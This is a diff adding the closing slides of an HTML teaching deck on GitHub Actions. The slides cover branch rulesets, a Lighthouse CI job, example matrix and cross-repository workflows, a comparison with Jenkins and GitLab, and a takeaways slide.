+          <tr><td>Block force pushes; restrict deletions</td><td>on</td></tr>
+          <tr><td>Bypass list</td><td>empty: no one, admins included</td></tr>
+        </tbody>
+      </table>
+      <p class="cap">Read back with <code>gh api repos/OWNER/REPO/rulesets/24459524</code>.</p>
+      <h3 style="margin-top:.3em;">A direct push to <code>main</code></h3>
+      <pre><code class="language-text">remote: error: GH013: Repository rule violations found for refs/heads/main.
+remote: - Changes must be made through a pull request.
+remote: - Required status check "Demo gate" is expected.
+ ! [remote rejected] HEAD -&gt; main (push declined due to repository rule violations)</code></pre>
+    </div>
+    <div class="dense">
+      <div class="card red">
+        <h3 class="r">PR #1: the check fails</h3>
+        <p>A deliberately wrong test: <code>Demo gate</code> red (<a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214705396">run 37214705396</a>); merge state <code>BLOCKED</code>.</p>
+        <pre><code class="language-text">$ gh pr merge 1 --squash
+X Pull request #1 is not mergeable: the base branch policy prohibits the merge.</code></pre>
+      </div>
+      <div class="card amber" style="margin-top:.3em;">
+        <h3 class="a">PR #3: every check green, still blocked</h3>
+        <p>The only change renames the job to <code>Demo gate (renamed)</code>. Its check passed (<a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37215299081">run 37215299081</a>) but is <code>isRequired: false</code>; the required <code>Demo gate</code> never reports, so the PR stays <code>BLOCKED</code>.</p>
+        <p><b>Required checks match the check's name</b>, which comes from the job's <code>name:</code> (or its ID), plus the matrix values for a matrix leg: <code>test (3.10)</code>. Rename a job, or change a matrix, and update the ruleset in the same change.</p>
+      </div>
+      <div class="card green" style="margin-top:.3em;">
+        <p>PR #2 passed <code>Demo gate</code> and was squash-merged (<a class="run" href="https://github.com/BrendanJamesLynskey/Introduction_to_GitHub_Actions/actions/runs/37214851553">run 37214851553</a>). Every change since then, including this deck, went in the same way.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 22 — LIGHTHOUSE ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">21</span>
+    <h2>Quality Gates Beyond Tests: Lighthouse CI</h2>
+  </div>
+  <div class="cols cols-2 code-sm">
+    <div>
+      <pre><code class="language-yaml">lighthouse:
+  name: Lighthouse
+  runs-on: ubuntu-latest
+  needs: [lint-and-typecheck, unit-tests]
+  services:
+    postgres:
+      image: postgres:16
+      env:
+        POSTGRES_USER: test
+        POSTGRES_PASSWORD: test
+        POSTGRES_DB: transformer_explainer_test
+      ports:
+        - 5432:5432
+      options: &gt;-
+        --health-cmd pg_isready
+        --health-interval 10s
+        --health-timeout 5s
+        --health-retries 5
+  # Production-like: no E2E credentials provider, real `pnpm build`.
+  env:
+    DATABASE_URL: postgres://test:test@localhost:5432/transformer_explainer_test
+    AUTH_SECRET: test-secret-do-not-use-in-production-test-secret
+    AUTH_GITHUB_ID: test
+    AUTH_GITHUB_SECRET: test
+    NEXT_PUBLIC_SITE_URL: http://localhost:3000
+    ADMIN_GITHUB_LOGINS: testadmin
+    AUTH_TRUST_HOST: "true"
+  steps:
+    - uses: actions/checkout@v4
+
+    # pnpm version comes from `packageManager` in package.json.
+    - uses: pnpm/action-setup@v4
+
+    - uses: actions/setup-node@v4
+      with:
+        node-version: 20
+        cache: pnpm
+
+    - run: pnpm install --frozen-lockfile
+    - run: pnpm db:migrate
+    - run: pnpm build
+    # Starts `pnpm start`, audits `/`, `/learn` and `/learn/03-attention`
+    # three times each, and fails on any category below 0.9.
+    - run: pnpm lighthouse
+
+    - name: Upload Lighthouse reports
+      if: always()
+      uses: actions/upload-artifact@v4
+      with:
+        name: lighthouse-reports
+        path: .lighthouseci/
+        include-hidden-files: true
+        retention-days: 7</code></pre>
+      <p class="cap"><code>transformer-explainer/.github/workflows/ci.yml</code> at <a href="https://github.com/BrendanJamesLynskey/transformer-explainer/blob/d13988f/.github/workflows/ci.yml#L139-L191">d13988f</a>, lines 139–191. Green at that commit: <a class="run" href="https://github.com/BrendanJamesLynskey/transformer-explainer/actions/runs/37214019146">run 37214019146</a>.</p>
+    </div>
+    <div class="dense">
+      <div class="card amber">
+        <ul>
+          <li><span class="a">Lighthouse</span>: Google's page auditor. It loads a page in Chrome and scores 0–100 for <span class="a">performance</span> (load speed), <span class="a">accessibility</span>, <span class="a">best practices</span> (security and modern-web hygiene) and <span class="a">SEO</span> (search-engine basics)</li>
+          <li><span class="a">Lighthouse CI (LHCI)</span>: a CLI (<code>lhci autorun</code>) that starts the site, audits each URL several times and fails if a score drops below a <span class="a">budget</span></li>
+        </ul>
+      </div>
+      <pre><code class="language-json">"assert": {
+  "assertions": {
+    "categories:performance": ["error", { "minScore": 0.9 }],
+    "categories:accessibility": ["error", { "minScore": 0.9 }],
+    "categories:best-practices": ["error", { "minScore": 0.9 }]
+  }
+},</code></pre>
+      <p class="cap"><code>lighthouserc.json</code>: three runs each of <code>/</code>, <code>/learn</code> and <code>/learn/03-attention</code>; any of the three categories below 0.9 fails the job.</p>
+      <div class="card green">
+        <p><span class="g">After deploying</span>, a <span class="g">smoke check</span> asks the live site whether it is healthy: <code>pnpm smoke https://…</code> (<code>scripts/smoke-check.ts</code>) fetches <code>/api/health</code> (200 only if the database is up and its schema is current) and every public page, and exits 1 on any failure. It is run by hand after each deploy (the project's RUNBOOK), not by this workflow.</p>
+      </div>
+      <p class="cap">Lighthouse job in the required checks on that repo's <code>main</code>, with Lint &amp; Typecheck, Unit Tests, Verify maths and E2E Tests. Docs: <a href="https://github.com/GoogleChrome/lighthouse-ci">GoogleChrome/lighthouse-ci</a>.</p>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 23 — REAL WORKFLOWS 1 ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">22</span>
+    <h2>Real Workflows: a PyTorch Matrix and a Rust Kernel</h2>
+  </div>
+  <div class="cols cols-2 code-sm">
+    <div>
+      <h3>Torch_Sim_Frontend <span class="pill green">matrix</span></h3>
+      <pre><code class="language-yaml">jobs:
+  test:
+    runs-on: ubuntu-24.04
+    strategy:
+      matrix:
+        python: ["3.10", "3.12"]
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: ${{ matrix.python }}
+      - name: Install (CPU-only PyTorch)
+        run: |
+          pip install torch --index-url https://download.pytorch.org/whl/cpu
+          pip install -e ".[test]" ruff
+      - name: Lint
+        run: ruff check src tests ci examples
+      - name: Tests (rules, four front ends agreeing, closed forms, PyTorch's FLOP counter, cost models)
+        run: pytest -p no:logging --cov=simfront
+      - name: Arithmetic and drift gate
+        run: python ci/perf_gate.py --margin 3.0
+      - name: CLI smoke test (Llama-3-70B on the meta device)
+        run: simfront --model llama3-70b --tokens 1024 --offload optical --top 5</code></pre>
+      <p class="cap"><a href="https://github.com/BrendanJamesLynskey/Torch_Sim_Frontend/blob/f78345d/.github/workflows/ci.yml">ci.yml at f78345d</a>; green: <a class="run" href="https://github.com/BrendanJamesLynskey/Torch_Sim_Frontend/actions/runs/37148753853">run 37148753853</a> (checks <code>test (3.10)</code>, <code>test (3.12)</code>). The CPU-only index keeps the PyTorch download small: no CUDA libraries on a runner with no GPU.</p>
+    </div>
+    <div>
+      <h3>Rust_DES_Kernel <span class="pill purple">two jobs</span></h3>
+      <pre><code class="language-yaml">jobs:
+  rust:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: dtolnay/rust-toolchain@stable
+        with:
+          components: rustfmt, clippy
+      - uses: Swatinem/rust-cache@v2
+      - name: Format
+        run: cargo fmt --check
+      - name: Clippy (library, tests, benches)
+        run: cargo clippy --all-targets -- -D warnings
+      - name: Tests (unit, golden parity, proptest, kernel)
+        run: cargo test --release
+      - name: CLI smoke test
+        run: cargo run --release --bin disagg-rs -- --n 200 --json &gt; /dev/null
+
+  python:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: dtolnay/rust-toolchain@stable
+        with:
+          components: clippy
+      - uses: Swatinem/rust-cache@v2
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+      - name: Clippy (PyO3 bindings)
+        run: cargo clippy --features python -- -D warnings
+      - name: Build the extension and install the Python reference simulator
+        run: |
+          python -m venv .venv
+          .venv/bin/pip install maturin
+          .venv/bin/maturin develop --release -E dev
+      - name: Differential tests against Disaggregated_Inference_Sim
+        run: .venv/bin/pytest pytests</code></pre>
+      <p class="cap"><a href="https://github.com/BrendanJamesLynskey/Rust_DES_Kernel/blob/91fcfc3/.github/workflows/ci.yml">ci.yml at 91fcfc3</a>; green: <a class="run" href="https://github.com/BrendanJamesLynskey/Rust_DES_Kernel/actions/runs/37206993167">run 37206993167</a>. <code>Swatinem/rust-cache</code> caches <code>target/</code> and the cargo registry. <code>maturin develop</code> builds the PyO3 extension into a venv, then pytest checks it against the Python simulator. Both workflows on this slide pin actions by tag (<code>@v4</code>), not SHA: a follow-up for Dependabot.</p>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 24 — REAL WORKFLOWS 2 ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">23</span>
+    <h2>Real Workflows: Cross-Repository Integration</h2>
+  </div>
+  <div class="cols cols-2 code-sm">
+    <div>
+      <h3>FHE_Accelerator_Sim <span class="pill amber">headline gate</span></h3>
+      <pre><code class="language-yaml">jobs:
+  test:
+    runs-on: ubuntu-24.04
+    strategy:
+      matrix:
+        python: ["3.10", "3.12"]
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: ${{ matrix.python }}
+      - uses: actions/setup-node@v4
+        with:
+          node-version: "22"
+      - name: Install (with Memory_System_Sim for the optional HBM model)
+        run: |
+          pip install -e ".[dev]"
+          pip install "memsim @ git+https://github.com/BrendanJamesLynskey/Memory_System_Sim"
+      - name: Tests (scheme counts, simulator, properties, OpenFHE and HEIR front ends, memory model, JavaScript port bit-exact with Python)
+        run: pytest -rs
+      - name: Headline result unchanged (ARK-class baseline, results.md §4)
+        run: |
+          fhe-sim --params ark --hw ark --json | python -c "
+          import json, sys
+          d = json.load(sys.stdin)
+          print(d['per_bootstrap_s'], d['bound'])
+          assert round(d['per_bootstrap_s'] * 1e3, 2) == 13.94 and d['bound'] == 'memory-bound'
+          "</code></pre>
+      <p class="cap"><a href="https://github.com/BrendanJamesLynskey/FHE_Accelerator_Sim/blob/6288e2b/.github/workflows/ci.yml">ci.yml at 6288e2b</a>; green: <a class="run" href="https://github.com/BrendanJamesLynskey/FHE_Accelerator_Sim/actions/runs/37153719825">run 37153719825</a>. Node is installed so the JavaScript-port parity tests run (slide 17), <code>-rs</code> lists any skips, a sibling repo is installed from git, and the last step fails the build if the published 13.94 ms result moves.</p>
+    </div>
+    <div>
+      <h3>Memory_System_Sim <span class="pill blue">second job</span></h3>
+      <pre><code class="language-yaml">fhe-integration:
+  runs-on: ubuntu-24.04
+  steps:
+    - uses: actions/checkout@v4
+    - uses: actions/setup-python@v5
+      with:
+        python-version: "3.12"
+    - name: Install with FHE_Accelerator_Sim
+      run: pip install -e ".[test,fhe]"
+    - name: FHE simulator with this HBM model
+      run: |
+        python -c "
+        from fhe_sim import ACCELERATORS, PARAMS, bootstrap_trace, simulate, summarise
+        from memsim.fhe import HBMChunkModel
+        hw = ACCELERATORS['ark']
+        a = summarise(simulate(bootstrap_trace(PARAMS['ark']), hw))
+        b = summarise(simulate(bootstrap_trace(PARAMS['ark']), hw.with_(memory=HBMChunkModel())))
+        print(a['per_bootstrap_s'], a['bound'], b['per_bootstrap_s'], b['bound'])
+        assert b['per_bootstrap_s'] &gt; a['per_bootstrap_s']
+        "</code></pre>
+      <p class="cap"><a href="https://github.com/BrendanJamesLynskey/Memory_System_Sim/blob/d3b77d9/.github/workflows/ci.yml">ci.yml at d3b77d9</a>; green: <a class="run" href="https://github.com/BrendanJamesLynskey/Memory_System_Sim/actions/runs/37148749389">run 37148749389</a> (<code>test (3.10)</code>, <code>test (3.12)</code>, <code>fhe-integration</code>). The second job installs the FHE simulator and checks the two models still fit together: the HBM model must make bootstrapping slower than the ideal memory.</p>
+      <div class="card amber dense">
+        <p>Each repo tests the other, so a change to one should re-run the other's workflow too: <code>gh workflow run ci.yml -R OWNER/OTHER</code>, or a <code>repository_dispatch</code> event sent from the first repo's CI.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 25 — COMPARISON ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">24</span>
+    <h2>Actions vs Jenkins vs GitLab CI</h2>
+  </div>
+  <div class="card blue">
+    <p>The full side-by-side table (hosting, config, extensibility, maintenance, cost, control) is on the <a href="https://brendanjameslynskey.github.io/Introduction_to_Jenkins/#/18">Introduction to Jenkins comparison slide</a>, with <a href="https://brendanjameslynskey.github.io/Introduction_to_Jenkins/#/19">when each one fits</a>. This slide adds only the Actions view.</p>
+  </div>
+  <div class="cols cols-2" style="margin-top:.4em;">
+    <div class="card green dense">
+      <h3 class="g">What Actions does best</h3>
+      <ul>
+        <li>Lives in the repo: workflows are reviewed in PRs, run on PRs, and report as checks rulesets can require</li>
+        <li>Nothing to host or patch on hosted runners; free for public repos</li>
+        <li>The Marketplace: thousands of ready-made actions (pin them)</li>
+        <li>GitHub-native events: issues, releases, comments, Dependabot, <code>workflow_dispatch</code> buttons</li>
+        <li>OIDC to the main clouds, environments with approvals</li>
+      </ul>
+    </div>
+    <div class="card red dense">
+      <h3 class="r">Where it is weaker</h3>
+      <ul>
+        <li>GitHub only; another forge means another CI</li>
+        <li>Hosted runners are generic VMs: no FPGA boards, licensed EDA tools or private lab networks without self-hosted runners, which you then maintain</li>
+        <li>Debugging needs a push and a wait; <code>act</code> only approximates</li>
+        <li>Long, stateful or hardware-bound regressions fit Jenkins better (<a href="https://brendanjameslynskey.github.io/SimEng_07_Jenkins_for_Simulation_Teams/">SimEng 07</a>)</li>
+        <li>GitLab bundles registry, environments and security scanning in one product, and organises <code>.gitlab-ci.yml</code> jobs into stages by default</li>
+      </ul>
+    </div>
+  </div>
+  <p class="cap" style="margin-top:.4em;">A common mix on this GitHub: Actions for every push and PR (fast, required checks), Jenkins for the simulator and RTL regressions that need local tools.</p>
+</section>
+
+
+<!-- ═══════════════════════════════ SLIDE 26 — TAKEAWAYS ═══════════════════════════════ -->
+<section data-background-color="#eaeff2">
+  <div class="slide-hdr">
+    <span class="tag">25</span>
+    <h2>Takeaways and Next Steps</h2>
+  </div>
+  <div class="cols cols-2">
+    <div class="card amber dense">
+      <h3 class="a">What we covered</h3>
+      <ul>
+        <li>An event starts a workflow; jobs run on fresh runners; steps <code>run</code> scripts or <code>uses</code> actions</li>
+        <li>Matrices for combinations; <code>needs</code> and outputs to chain jobs; services for databases</li>
+        <li>Cache by content hash; artifacts for files; summaries and annotations for people</li>
+        <li>Composite actions share steps; reusable workflows share jobs</li>
+        <li><code>permissions: {}</code> then grant per job; secrets in environments; OIDC, not cloud keys</li>
+        <li>Pin actions by SHA and let Dependabot bump them; untrusted text goes through <code>env</code></li>
+        <li>Debug with <code>--debug</code> re-runs and <code>actionlint</code>; make skipped tests loud</li>
+        <li>Concurrency groups, timeouts, path filters (not on required checks)</li>
+        <li>Rulesets make <code>main</code> need passing, correctly named checks</li>
+      </ul>
+    </div>
+    <div class="dense">
+      <div class="card green">
+        <h3 class="g">Next</h3>
+        <ul>
+          <li><a href="https://brendanjameslynskey.github.io/Introduction_to_CI_CD/">Introduction to CI/CD</a>: the practice behind all of this</li>
+          <li><a href="https://brendanjameslynskey.github.io/Introduction_to_Jenkins/">Introduction to Jenkins</a>: the self-hosted alternative</li>
+          <li><a href="https://brendanjameslynskey.github.io/SimEng_07_Jenkins_for_Simulation_Teams/">SimEng 07: Jenkins for Simulation Teams</a>: CI for simulators and RTL</li>
+          <li><a href="https://github.com/BrendanJamesLynskey/Interview_CI_CD">Interview_CI_CD</a>: questions to test yourself</li>
+        </ul>
+      </div>
+      <div class="card blue" style="margin-top:.4em;">
+        <h3 class="b">Further reading</h3>
+        <ul>
+          <li><a href="https://docs.github.com/en/actions">GitHub Actions documentation</a></li>
+          <li><a href="https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax">Workflow syntax</a></li>
+          <li><a href="https://docs.github.com/en/actions/reference/security/secure-use">Secure use reference</a></li>
+          <li><a href="https://github.com/rhysd/actionlint">actionlint</a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+</div><!-- /.slides -->
+</div><!-- /.reveal -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/reveal.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/plugin/highlight/highlight.min.js"></script>
+<script>
+Reveal.initialize({
+  hash: true,
+  slideNumber: 'c/t',
+  transition: 'fade',
+  transitionSpeed: 'fast',
+  controls: true,
+  progress: true,
+  center: false,
+  width: 1100,
+  height: 900,
+  margin: 0.01,
+  plugins: [RevealHighlight],
+  highlight: { theme: 'monokai' }
+});
+</script>
+<script>
+(function(){
+  var h = Reveal.getConfig().height || 900;
+  var m = Reveal.getConfig().margin || 0.02;
+  var maxH = Math.floor(h * (1 - 2 * m)) + 'px';
+  function fixSlides(){
+    document.querySelectorAll('.reveal .slides>section,.reveal .slides>section>section').forEach(function(s){
+      s.style.display = 'block';
+      s.style.maxHeight = maxH;
+    });
+  }
+  Reveal.on('ready', fixSlides);
+  Reveal.on('slidechanged', fixSlides);
+})();
+</script>
+</body>
+</html>
